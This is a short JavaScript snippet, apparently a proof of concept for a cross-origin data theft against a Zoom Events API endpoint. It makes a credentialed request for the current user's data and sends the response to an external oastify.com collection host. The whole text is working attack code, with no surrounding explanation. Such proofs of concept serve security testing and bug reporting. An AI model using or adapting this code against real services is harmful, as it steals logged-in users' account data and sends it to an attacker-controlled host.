var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('GET','https://events.zoom.us/api/v1/e/getCurrentUser',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    fetch(('https://q4vjpxn55uu0ig5ejl8w4k7z7qdi1bp0.oastify.com/?xxx='+this.responseText))
    .then(res => res.json())
    .then(data => console.log(data))
};
